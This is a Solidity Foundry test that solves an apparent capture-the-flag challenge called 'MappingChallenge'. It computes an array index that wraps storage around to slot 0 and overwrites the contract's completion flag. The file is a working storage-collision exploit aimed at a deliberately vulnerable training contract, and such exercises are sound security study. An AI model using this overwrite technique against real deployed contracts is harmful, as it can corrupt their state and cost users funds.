// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
import "forge-std/Test.sol";

interface IMappingChallenge {
    function set(uint256 key, uint256 value) external;
    function get(uint256 key) external view returns(uint256);
    function isComplete() external view returns(bool);
}

contract MappingChallengeTest is Test {
    IMappingChallenge target;
    address player;
    function setUp() public {
        address deployment = deployCode("4.sol:MappingChallenge");
        target = IMappingChallenge(deployment);
        player = vm.addr(1);
        vm.deal(player, 100 ether);
    }

    function testComplete() public {
        vm.startPrank(player);
        uint max = type(uint256).max;
        uint mapSlot1 = uint256(keccak256(abi.encode(1)));
        uint res = max - mapSlot1;
        emit log_named_uint("slot0", res + mapSlot1 + 1);
        target.set(res + 1, 1);
        assertTrue(target.isComplete());
    }
}